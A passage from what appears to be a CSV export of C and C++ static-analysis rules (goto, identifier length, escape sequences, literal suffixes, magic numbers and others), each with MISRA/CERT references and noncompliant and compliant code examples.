original. Therefore, limited use of <code>goto</code> is sometimes advised. </p>
<p>However, the use of <code>goto</code> to jump into or out of a sub-block of code, such as into the body of a <code>for</code> loop is never
acceptable, because it is extremely difficult to understand and will likely yield results other than what is intended. </p>
<h2>Noncompliant Code Example</h2>
<pre>
void f1 (int a) {
  if (a &lt;=0) {
    goto L2;  // Noncompliant; jumps into a different block
  }

  if (a == 0) {
  {
    goto L1; // Compliant
  }
  goto L2;  // Noncompliant; jumps into a block

L1:
  for (int i = 0; i &lt; a; i++) {
  L2:
    //...  Should only have come here with a &gt;=0. Loop is infinite if a &lt; 0
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
void f1 (int a) {
  if (a &lt;=0) {
    // ...
  }

  if (a == 0) {
  {
    goto L1; // Compliant
  }

L1:
  for (int i = 0; i &lt; a; i++) {
  L2:
    //...
  }
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 6-6-1 - Any label referenced by a goto statement shall be declared in the same block, or in a block enclosing the goto
  statement </li>
  <li> MISRA C:2012, 15.3 - Any label referenced by a goto statement shall be declared in the same block, or in a block enclosing the goto statement
  </li>
</ul>","""goto"" statements should not be used to jump into blocks",[],BLOCKER,"['brain-overload', 'misra', 'pitfall']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p><code>goto</code> is an unstructured control flow statement. It makes code less readable and maintainable. Structured control flow statements such
as <code>if</code>, <code>for</code>, <code>while</code>, <code>continue</code> or <code>break</code> should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = 0;
loop:
  printf(""i = %d\n"", i);
  i++;
  if (i &lt; 10){
    goto loop; // Noncompliant
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {
  printf(""i = %d\n"", i);
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.4 - The goto statement shall not be used. </li>
  <li> MISRA C:2012, 15.1 - The goto statement should not be used </li>
</ul>",cpp:GotoUsage,cpp,C++,"<p><code>goto</code> is an unstructured control flow statement. It makes code less readable and maintainable. Structured control flow statements such
as <code>if</code>, <code>for</code>, <code>while</code>, <code>continue</code> or <code>break</code> should be used instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int i = 0;
loop:
  printf(""i = %d\n"", i);
  i++;
  if (i &lt; 10){
    goto loop; // Noncompliant
  }
</pre>
<h2>Compliant Solution</h2>
<pre>
for (int i = 0; i &lt; 10; i++) {
  printf(""i = %d\n"", i);
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 14.4 - The goto statement shall not be used. </li>
  <li> MISRA C:2012, 15.1 - The goto statement should not be used </li>
</ul>","""goto"" statement should not be used",[],MAJOR,"['brain-overload', 'misra']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>In addition to being difficult to use, too-long variable names can limit code portability. The ISO standard requires that variable, type, function
and label names be no more than 31 characters long. </p>
<p>Note that 31 characters is an upper bound, rather than a length recommendation. Shorter names are better, as long as they're still
communicative.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int this_is_a_very_long_identifier_that_definitely_should_be_renamed = 0;
</pre>
<h2>Compliant Solution</h2>
<pre>
int reasonable_identifier = 0;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 5.1 - Identifiers (internal and external) shall not rely on the significance of more than 31 character. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QAU"">CERT, DCL23-C.</a> - Guarantee that mutually visible identifiers are unique </li>
</ul>",cpp:IdentifierLongerThan31,cpp,C++,"<p>In addition to being difficult to use, too-long variable names can limit code portability. The ISO standard requires that variable, type, function
and label names be no more than 31 characters long. </p>
<p>Note that 31 characters is an upper bound, rather than a length recommendation. Shorter names are better, as long as they're still
communicative.</p>
<h2>Noncompliant Code Example</h2>
<pre>
int this_is_a_very_long_identifier_that_definitely_should_be_renamed = 0;
</pre>
<h2>Compliant Solution</h2>
<pre>
int reasonable_identifier = 0;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 5.1 - Identifiers (internal and external) shall not rely on the significance of more than 31 character. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QAU"">CERT, DCL23-C.</a> - Guarantee that mutually visible identifiers are unique </li>
</ul>",Identifiers should not be longer than 31 characters,[],MAJOR,"['cert', 'misra']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The use of increment and decrement operators in method calls or in combination with other arithmetic operators is not recommended, because:</p>
<ul>
  <li> It can significantly impair the readability of the code. </li>
  <li> It introduces additional side effects into a statement, with the potential for undefined behavior. </li>
  <li> It is safer to use these operators in isolation from any other arithmetic operators. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
u8a = ++u8b + u8c--;
foo = bar++ / 4;
</pre>
<h2>Compliant Solution</h2>
<p>The following sequence is clearer and therefore safer:</p>
<pre>
++u8b;
u8a = u8b + u8c;
u8c--;
foo = bar / 4;
bar++;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 12.1 - Limited dependence should be placed on the C operator precedence rules in expressions. </li>
  <li> MISRA C:2004, 12.13 - The increment (++) and decrement (--) operators should not be mixed with other operators in an expression. </li>
  <li> MISRA C++:2008, 5-2-10 - The increment (++) and decrement (--) operator should not be mixed with other operators in an expression. </li>
  <li> MISRA C:2012, 12.1 - The precedence of operators within expressions should be made explicit </li>
  <li> MISRA C:2012, 13.3 - A full expression containing an increment (++) or decrement (--) operator should have no other potential side effects
  other than that cause by the increment or decrement operator </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/ZwE"">CERT, EXP30-C.</a> - Do not depend on the order of evaluation for side effects
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/fYAyAQ"">CERT, EXP50-CPP.</a> - Do not depend on the order of evaluation for side
  effects </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/yQC7AQ"">CERT, EXP05-J.</a> - Do not follow a write by a subsequent write or read of the
  same object within an expression </li>
</ul>",cpp:IncAndDecMixedWithOtherOperators,cpp,C++,"<p>The use of increment and decrement operators in method calls or in combination with other arithmetic operators is not recommended, because:</p>
<ul>
  <li> It can significantly impair the readability of the code. </li>
  <li> It introduces additional side effects into a statement, with the potential for undefined behavior. </li>
  <li> It is safer to use these operators in isolation from any other arithmetic operators. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
u8a = ++u8b + u8c--;
foo = bar++ / 4;
</pre>
<h2>Compliant Solution</h2>
<p>The following sequence is clearer and therefore safer:</p>
<pre>
++u8b;
u8a = u8b + u8c;
u8c--;
foo = bar / 4;
bar++;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 12.1 - Limited dependence should be placed on the C operator precedence rules in expressions. </li>
  <li> MISRA C:2004, 12.13 - The increment (++) and decrement (--) operators should not be mixed with other operators in an expression. </li>
  <li> MISRA C++:2008, 5-2-10 - The increment (++) and decrement (--) operator should not be mixed with other operators in an expression. </li>
  <li> MISRA C:2012, 12.1 - The precedence of operators within expressions should be made explicit </li>
  <li> MISRA C:2012, 13.3 - A full expression containing an increment (++) or decrement (--) operator should have no other potential side effects
  other than that cause by the increment or decrement operator </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/ZwE"">CERT, EXP30-C.</a> - Do not depend on the order of evaluation for side effects
  </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/fYAyAQ"">CERT, EXP50-CPP.</a> - Do not depend on the order of evaluation for side
  effects </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/yQC7AQ"">CERT, EXP05-J.</a> - Do not follow a write by a subsequent write or read of the
  same object within an expression </li>
</ul>",Increment (++) and decrement (--) operators should not be used in a method call or mixed with other operators in an expression,[],MAJOR,"['cert', 'misra']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The use of an undefined escape sequence leads to undefined behavior. The defined escape sequences (ISO/IEC 14882:2003 [1] Ã‚Â§2.13.2) are:
<code>\n</code>, <code>\t</code>, <code>\v</code>, <code>\b</code>, <code>\r</code>, <code>\f</code>, <code>\a</code>, <code>\\</code>,
<code>?</code>, <code>\'</code>, <code>\""</code>, <code>\&lt;Octal Number&gt;</code>, and <code>\x&lt;Hexadecimal Number&gt;</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const char_t a[ 2 ] = ""\k"";   // Noncompliant
const char_t b[ 2 ] = ""\b"";   // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 4.1 - Only those escape sequences that are defined in ISO C standard shall be used. </li>
  <li> MISRA C++:2008, 2-13-1 - Only those escape sequences that are defined in ISO/IEC 14882:2003 shall be used. </li>
</ul>",cpp:InvalidEscapeSequence,cpp,C++,"<p>The use of an undefined escape sequence leads to undefined behavior. The defined escape sequences (ISO/IEC 14882:2003 [1] Ã‚Â§2.13.2) are:
<code>\n</code>, <code>\t</code>, <code>\v</code>, <code>\b</code>, <code>\r</code>, <code>\f</code>, <code>\a</code>, <code>\\</code>,
<code>?</code>, <code>\'</code>, <code>\""</code>, <code>\&lt;Octal Number&gt;</code>, and <code>\x&lt;Hexadecimal Number&gt;</code>.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const char_t a[ 2 ] = ""\k"";   // Noncompliant
const char_t b[ 2 ] = ""\b"";   // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 4.1 - Only those escape sequences that are defined in ISO C standard shall be used. </li>
  <li> MISRA C++:2008, 2-13-1 - Only those escape sequences that are defined in ISO/IEC 14882:2003 shall be used. </li>
</ul>",Only escape sequences defined in the ISO C standard should be used,[],MAJOR,['misra'],BUG
2013-06-19T07:34:52+0200,<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>,cpp:LineLength,cpp,C++,<p>Having to scroll horizontally makes it harder to get a quick overview and understanding of any piece of code.</p>,Lines should not be too long,"[{'key': 'maximumLineLength', 'htmlDesc': 'The maximum authorized line length', 'defaultValue': '80', 'type': 'INTEGER'}]",MAJOR,['convention'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Using upper case literal suffixes removes the potential ambiguity between ""1"" (digit 1) and ""l"" (letter el) for declaring literals.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const int        a = 0u;      // Noncompliant
const int        b = 0l;      // Noncompliant
const int        c = 0Ul;     // Noncompliant
const int        d = 0x12bu;  // Noncompliant
const float      m = 1.2f;    // Noncompliant
const float      n = 1.2l;    // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
const int        a = 0U;
const int        b = 0L;
const int        c = 0UL;
const int        d = 0x12bU;
const float      m = 1.2F;
const float      n = 1.2L;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 2-13-4 - Literal suffixes shall be upper case </li>
  <li> MISRA C:2012, 7.3 - The lowercase character ""l"" shall not be used in a literal suffix </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/koAtAQ"">CERT DCL16-C.</a> - Use ""L,"" not ""l,"" to indicate a long value </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/hYClBg"">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>",cpp:LiteralSuffix,cpp,C++,"<p>Using upper case literal suffixes removes the potential ambiguity between ""1"" (digit 1) and ""l"" (letter el) for declaring literals.</p>
<h2>Noncompliant Code Example</h2>
<pre>
const int        a = 0u;      // Noncompliant
const int        b = 0l;      // Noncompliant
const int        c = 0Ul;     // Noncompliant
const int        d = 0x12bu;  // Noncompliant
const float      m = 1.2f;    // Noncompliant
const float      n = 1.2l;    // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
const int        a = 0U;
const int        b = 0L;
const int        c = 0UL;
const int        d = 0x12bU;
const float      m = 1.2F;
const float      n = 1.2L;
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 2-13-4 - Literal suffixes shall be upper case </li>
  <li> MISRA C:2012, 7.3 - The lowercase character ""l"" shall not be used in a literal suffix </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/koAtAQ"">CERT DCL16-C.</a> - Use ""L,"" not ""l,"" to indicate a long value </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/hYClBg"">CERT, DCL50-J.</a> - Use visually distinct identifiers </li>
</ul>",Literal suffixes shall be upper case,[],MINOR,"['cert', 'convention', 'misra', 'pitfall']",CODE_SMELL
2013-06-19T07:34:52+0200,"<p>The effect of this rule is to require that operands are appropriately parenthesized. Parentheses are important in this situation both for
readability of code and for ensuring that the behavior is as the developer intended.</p>
<p>Where an expression consists of either a sequence of only logical <code>&amp;&amp;</code> or a sequence of logical <code>||</code>, extra
parentheses are not required.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0 &amp;&amp; ishigh);                   // Noncompliant
if (x || y || z);
if (x || y &amp;&amp; z);                        // Noncompliant
if (x &amp;&amp; !y);                            // Noncompliant
if (is_odd(y) &amp;&amp; x);
if ((x &gt; c1) &amp;&amp; (y &gt; c2) &amp;&amp; (z &gt; c3));
if ((x &gt; c1) &amp;&amp; (y &gt; c2) || (z &gt; c3));   // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if ((x == 0) &amp;&amp; ishigh);
if (x || y || z);
if (x || (y &amp;&amp; z));
if (x &amp;&amp; (!y));
if (is_odd(y) &amp;&amp; x);
if ((x &gt; c1) &amp;&amp; (y &gt; c2) &amp;&amp; (z &gt; c3));
if ((x &gt; c1) &amp;&amp; ((y &gt; c2) || (z &gt; c3)));
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 12.5 - The operands of a logical &amp;&amp; or || shall be primary-expressions. </li>
  <li> MISRA C++:2008, 5-2-1 - Each operand of a logical &amp;&amp; or || shall be a postfix-expression. </li>
</ul>",cpp:LogicalExpressionOperands,cpp,C++,"<p>The effect of this rule is to require that operands are appropriately parenthesized. Parentheses are important in this situation both for
readability of code and for ensuring that the behavior is as the developer intended.</p>
<p>Where an expression consists of either a sequence of only logical <code>&amp;&amp;</code> or a sequence of logical <code>||</code>, extra
parentheses are not required.</p>
<h2>Noncompliant Code Example</h2>
<pre>
if (x == 0 &amp;&amp; ishigh);                   // Noncompliant
if (x || y || z);
if (x || y &amp;&amp; z);                        // Noncompliant
if (x &amp;&amp; !y);                            // Noncompliant
if (is_odd(y) &amp;&amp; x);
if ((x &gt; c1) &amp;&amp; (y &gt; c2) &amp;&amp; (z &gt; c3));
if ((x &gt; c1) &amp;&amp; (y &gt; c2) || (z &gt; c3));   // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
if ((x == 0) &amp;&amp; ishigh);
if (x || y || z);
if (x || (y &amp;&amp; z));
if (x &amp;&amp; (!y));
if (is_odd(y) &amp;&amp; x);
if ((x &gt; c1) &amp;&amp; (y &gt; c2) &amp;&amp; (z &gt; c3));
if ((x &gt; c1) &amp;&amp; ((y &gt; c2) || (z &gt; c3)));
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 12.5 - The operands of a logical &amp;&amp; or || shall be primary-expressions. </li>
  <li> MISRA C++:2008, 5-2-1 - Each operand of a logical &amp;&amp; or || shall be a postfix-expression. </li>
</ul>","Operands of ""&&"" and ""||"" should be primary (C) or postfix (C++) expressions",[],MAJOR,['misra'],CODE_SMELL
2013-06-19T07:34:52+0200,"<p>Concatenation of wide and narrow string literals leads to undefined behavior.</p>
<h2>Noncompliant Code Example</h2>
<pre>
wchar_t n_array[] = ""Hello"" L""World"";     // Noncompliant
wchar_t w_array[] = L""Hello"" ""World"";     // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
char_t n_array[] = ""Hello"" ""World"";     // Compliant
wchar_t w_array[] = L""Hello"" L""World"";	// Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 2-13-5 - Narrow and wide string literals shall not be concatenated. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QIEzAg"">CERT STR10-C.</a> - Do not concatenate different type of string literals </li>
</ul>",cpp:NarrowAndWideStringConcat,cpp,C++,"<p>Concatenation of wide and narrow string literals leads to undefined behavior.</p>
<h2>Noncompliant Code Example</h2>
<pre>
wchar_t n_array[] = ""Hello"" L""World"";     // Noncompliant
wchar_t w_array[] = L""Hello"" ""World"";     // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
char_t n_array[] = ""Hello"" ""World"";     // Compliant
wchar_t w_array[] = L""Hello"" L""World"";	// Compliant
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C++:2008, 2-13-5 - Narrow and wide string literals shall not be concatenated. </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/QIEzAg"">CERT STR10-C.</a> - Do not concatenate different type of string literals </li>
</ul>",Narrow and wide string literals should not be concatenated,[],MAJOR,"['cert', 'misra']",BUG
2017-05-05T12:32:52+0200,"<p>If a boolean expression doesn't change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous
because it does not match the programmer's intent, then it's a bug and the expression should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = true;
if (a) { // Noncompliant
  doSomething();
}

if (b &amp;&amp; a) { // Noncompliant; ""a"" is always ""true""
  doSomething();
}

if (c || !a) { // Noncompliant; ""!a"" is always ""false""
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a = true;
if (foo(a)) {
  doSomething();
}

if (b) {
  doSomething();
}

if (c) {
  doSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",c:S2589,c,C,"<p>If a boolean expression doesn't change the evaluation of the condition, then it is entirely unnecessary, and can be removed. If it is gratuitous
because it does not match the programmer's intent, then it's a bug and the expression should be fixed.</p>
<h2>Noncompliant Code Example</h2>
<pre>
a = true;
if (a) { // Noncompliant
  doSomething();
}

if (b &amp;&amp; a) { // Noncompliant; ""a"" is always ""true""
  doSomething();
}

if (c || !a) { // Noncompliant; ""!a"" is always ""false""
  doSomething();
}
</pre>
<h2>Compliant Solution</h2>
<pre>
a = true;
if (foo(a)) {
  doSomething();
}

if (b) {
  doSomething();
}

if (c) {
  doSomething();
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 13.7 - Boolean operations whose results are invariant shall not be permitted. </li>
  <li> MISRA C:2012, 14.3 - Controlling expressions shall not be invariant </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/571"">MITRE, CWE-571</a> - Expression is Always True </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/570"">MITRE, CWE-570</a> - Expression is Always False </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/489"">MITRE, CWE-489</a> - Leftover Debug Code </li>
  <li> <a href=""https://www.securecoding.cert.org/confluence/x/NYA5"">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never
  executed </li>
</ul>",Boolean expressions should not be gratuitous,[],MAJOR,"['cert', 'cwe', 'misra', 'redundant']",CODE_SMELL
2015-02-03T08:39:44+0100,"<p>Preprocessing directives (lines that start with <code>#</code>) can be used to conditionally include or exclude code from compilation. Malformed
preprocessing directives could lead to the exclusion or inclusion of more code than was intended. Therefore all preprocessing directives should be
syntactically meaningful.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#define AAA 2
...
int foo(void)
{
  int x = 0;
  ...

#ifndef AAA
  x = 1;
#else1  /* Noncompliant */
  x = AAA;
#endif

  ...
  return x;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#define AAA 2
...
int foo(void)
{
  int x = 0;
  ...

#ifndef AAA
  x = 1;
#else
  x = AAA;
#endif

  ...
  return x;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 19.16 - Preprocessing directives shall be syntactically meaningful even when excluded by preprocessor. </li>
  <li> MISRA C++:2008, 16-0-8 - If the # token appears as the first token on a line, then it shall be immediately followed by a preprocessing token.
  </li>
  <li> MISRA C:2012, 20.13 - A line whose first token is # shall be a valid preprocessing directive </li>
</ul>",c:S977,c,C,"<p>Preprocessing directives (lines that start with <code>#</code>) can be used to conditionally include or exclude code from compilation. Malformed
preprocessing directives could lead to the exclusion or inclusion of more code than was intended. Therefore all preprocessing directives should be
syntactically meaningful.</p>
<h2>Noncompliant Code Example</h2>
<pre>
#define AAA 2
...
int foo(void)
{
  int x = 0;
  ...

#ifndef AAA
  x = 1;
#else1  /* Noncompliant */
  x = AAA;
#endif

  ...
  return x;
}
</pre>
<h2>Compliant Solution</h2>
<pre>
#define AAA 2
...
int foo(void)
{
  int x = 0;
  ...

#ifndef AAA
  x = 1;
#else
  x = AAA;
#endif

  ...
  return x;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 19.16 - Preprocessing directives shall be syntactically meaningful even when excluded by preprocessor. </li>
  <li> MISRA C++:2008, 16-0-8 - If the # token appears as the first token on a line, then it shall be immediately followed by a preprocessing token.
  </li>
  <li> MISRA C:2012, 20.13 - A line whose first token is # shall be a valid preprocessing directive </li>
</ul>","Lines starting with ""#"" should contain valid preprocessing directives",[],MAJOR,"['misra', 'preprocessor']",BUG
2015-02-03T08:39:44+0100,"<p>Casting an object pointer can very easily lead to undefined behavior. Only a few cases are supported, for instance casting an object pointer to a
large enough integral type (and back again), casting an object pointer to a pointer to void (and back again)... Using a pointer cast to access an
object as if it was of another type than its real type is not supported in general.</p>
<p>This rule detect casts between object pointers and incompatible types.</p>
<h2>Noncompliant Code Example</h2>
<pre>
struct S1 *p1;
struct S2;
void f ()
{
  (float) p1; // Noncompliant, conversion to floating point type
  (int *) p1; // Noncompliant
  float f;
  int *i = (int *)&amp;f; // Noncompliant, undefined behavior even if sizeof(int) == sizeof(float)
  (int) p1; // Compliant, but might be undefined behavior if 'int' is not large enough to hold the value of p1.
  (void *) p1; // Compliant, conversion to 'void *'
  (struct S2 *)p1; // Noncompliant, conversion to another type.
}
</pre>
<h2>Exceptions</h2>
<p>In C, it is allowed to cast an object pointer to a character pointer to access the byte representation of the object. This rule ignores this
case.</p>
<p>Anything can be safely cast to <code>void</code> (since nothing can be done with a result of this cast), and doing so is a common pattern to
silence compiler warnings about unused variables. This rule ignores such casts.</p>
<pre>
void f(int *p) {
  (void)p;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 11.2 - Conversions shall not be performed between a pointer to object and any type other than an integral type, another pointer
  to object type or a pointer to void. </li>
  <li> MISRA C:2012, 11.3 - A cast shall not be performed between a pointer to object type and a pointer to a different object type. </li>
</ul>",c:S856,c,C,"<p>Casting an object pointer can very easily lead to undefined behavior. Only a few cases are supported, for instance casting an object pointer to a
large enough integral type (and back again), casting an object pointer to a pointer to void (and back again)... Using a pointer cast to access an
object as if it was of another type than its real type is not supported in general.</p>
<p>This rule detect casts between object pointers and incompatible types.</p>
<h2>Noncompliant Code Example</h2>
<pre>
struct S1 *p1;
struct S2;
void f ()
{
  (float) p1; // Noncompliant, conversion to floating point type
  (int *) p1; // Noncompliant
  float f;
  int *i = (int *)&amp;f; // Noncompliant, undefined behavior even if sizeof(int) == sizeof(float)
  (int) p1; // Compliant, but might be undefined behavior if 'int' is not large enough to hold the value of p1.
  (void *) p1; // Compliant, conversion to 'void *'
  (struct S2 *)p1; // Noncompliant, conversion to another type.
}
</pre>
<h2>Exceptions</h2>
<p>In C, it is allowed to cast an object pointer to a character pointer to access the byte representation of the object. This rule ignores this
case.</p>
<p>Anything can be safely cast to <code>void</code> (since nothing can be done with a result of this cast), and doing so is a common pattern to
silence compiler warnings about unused variables. This rule ignores such casts.</p>
<pre>
void f(int *p) {
  (void)p;
}
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 11.2 - Conversions shall not be performed between a pointer to object and any type other than an integral type, another pointer
  to object type or a pointer to void. </li>
  <li> MISRA C:2012, 11.3 - A cast shall not be performed between a pointer to object type and a pointer to a different object type. </li>
</ul>",Pointer conversions should be restricted to a safe subset,[],MAJOR,['misra'],BUG
2013-09-16T11:41:23+0200,"<p>A magic number is a number that comes out of nowhere, and is directly used in a statement. Magic numbers are often used, for instance to limit the
number of iterations of a loops, to test the value of a property, etc.</p>
<p>Using magic numbers may seem obvious and straightforward when you're writing a piece of code, but they are much less obvious and straightforward at
debugging time.</p>
<p>That is why magic numbers must be demystified by first being assigned a name. This is classically done by using a constant (<code>constexpr</code>
or <code>const</code> if your compiler does not support <code>constexpr</code> yet) or an enumeration.</p>
<p>-1, 0 and 1 are not considered magic numbers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething(int var) {
  for(int i = 0; i &lt; 42; i++) { // Noncompliant - 42 is a magic number
    // ...
  }

  if (var == 42) { // Noncompliant - magic number
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
enum Status {
STATUS_KO = 0,
STATUS_OK = 42,
};

void doSomething(Status var) {
  constexpr int maxIterations = 42; // Compliant - in a declaration
  for(int i = 0; i &lt; maxIterations ; i++){ // Compliant
    // ...
  }

  if (var == STATUS_KO) { // Compliant - 0 is excluded
    // ...
  }

  if (var == STATUS_OK) { // Compliant - number comes from a macro
    // ...
  }
}
</pre>",c:S109,c,C,"<p>A magic number is a number that comes out of nowhere, and is directly used in a statement. Magic numbers are often used, for instance to limit the
number of iterations of a loops, to test the value of a property, etc.</p>
<p>Using magic numbers may seem obvious and straightforward when you're writing a piece of code, but they are much less obvious and straightforward at
debugging time.</p>
<p>That is why magic numbers must be demystified by first being assigned a name. This is classically done by using a constant (<code>constexpr</code>
or <code>const</code> if your compiler does not support <code>constexpr</code> yet) or an enumeration.</p>
<p>-1, 0 and 1 are not considered magic numbers.</p>
<h2>Noncompliant Code Example</h2>
<pre>
void doSomething(int var) {
  for(int i = 0; i &lt; 42; i++) { // Noncompliant - 42 is a magic number
    // ...
  }

  if (var == 42) { // Noncompliant - magic number
    // ...
  }
}
</pre>
<h2>Compliant Solution</h2>
<pre>
enum Status {
STATUS_KO = 0,
STATUS_OK = 42,
};

void doSomething(Status var) {
  constexpr int maxIterations = 42; // Compliant - in a declaration
  for(int i = 0; i &lt; maxIterations ; i++){ // Compliant
    // ...
  }

  if (var == STATUS_KO) { // Compliant - 0 is excluded
    // ...
  }

  if (var == STATUS_OK) { // Compliant - number comes from a macro
    // ...
  }
}
</pre>",Magic numbers should not be used,[],MAJOR,['brain-overload'],CODE_SMELL
2014-08-07T09:36:27+0200,"<p>While keywords introduced in later standards can legally be used as identifiers in code compiled to earlier standards, doing so will eventually
cause problems. Such code will cause compile errors if (when) the compiler is upgraded, and fixing those errors could be difficult and painful. </p>
<p>Additionally, such misuse of keywords has the potential to thoroughly confuse people who are unfamiliar with the code base, possibly leading them
to introduce additional errors. </p>
<p>For these reasons, the earlier this practice is stopped, the better.</p>
<p>This rule flags instances of the following keywords used as identifiers:</p>
<p><strong>C99</strong></p>
<p><code>inline</code>, <code>restrict</code>, <code>_Bool</code>, <code>_Complex</code>, <code>_Noreturn</code>, <code>_Static_assert</code>,
<code>_Thread_local</code></p>
<p><strong>C11</strong></p>
<p><code>_Alignas</code>, <code>_Alignof</code>, <code>_Atomic</code>, <code>_Generic</code>, <code>_Imaginary</code></p>
<p><strong>C++11</strong></p>
<p><code>alignas</code>, <code>alignof</code>, <code>char16_t</code>, <code>char32_t</code>, <code>constexpr</code>, <code>decltype</code>,
<code>noexcept</code>, <code>nullptr</code>, <code>static_assert</code>, <code>thread_local</code></p>
<p><strong>C++20</strong></p>
<p><code>concept</code>,<code>requires</code></p>
<h2>Noncompliant Code Example</h2>
<pre>
int inline = 0;
</pre>
<h2>Compliant Solution</h2>
<pre>
int inline_count = 0;
</pre>",c:S1760,c,C,"<p>While keywords introduced in later standards can legally be used as identifiers in code compiled to earlier standards, doing so will eventually
cause problems. Such code will cause compile errors if (when) the compiler is upgraded, and fixing those errors could be difficult and painful. </p>
<p>Additionally, such misuse of keywords has the potential to thoroughly confuse people who are unfamiliar with the code base, possibly leading them
to introduce additional errors. </p>
<p>For these reasons, the earlier this practice is stopped, the better.</p>
<p>This rule flags instances of the following keywords used as identifiers:</p>
<p><strong>C99</strong></p>
<p><code>inline</code>, <code>restrict</code>, <code>_Bool</code>, <code>_Complex</code>, <code>_Noreturn</code>, <code>_Static_assert</code>,
<code>_Thread_local</code></p>
<p><strong>C11</strong></p>
<p><code>_Alignas</code>, <code>_Alignof</code>, <code>_Atomic</code>, <code>_Generic</code>, <code>_Imaginary</code></p>
<p><strong>C++11</strong></p>
<p><code>alignas</code>, <code>alignof</code>, <code>char16_t</code>, <code>char32_t</code>, <code>constexpr</code>, <code>decltype</code>,
<code>noexcept</code>, <code>nullptr</code>, <code>static_assert</code>, <code>thread_local</code></p>
<p><strong>C++20</strong></p>
<p><code>concept</code>,<code>requires</code></p>
<h2>Noncompliant Code Example</h2>
<pre>
int inline = 0;
</pre>
<h2>Compliant Solution</h2>
<pre>
int inline_count = 0;
</pre>",Keywords introduced in later specifications should not be used as identifiers,[],BLOCKER,[],CODE_SMELL
2015-11-05T15:08:10+0100,"<p>The use of <code>bool</code> operands with other operators is unlikely to be meaningful (or intended). Best case it will be confusing to
maintainers, worst case it will not have the intended effect. Either way, it is highly recommended to stick to boolean operators when dealing with
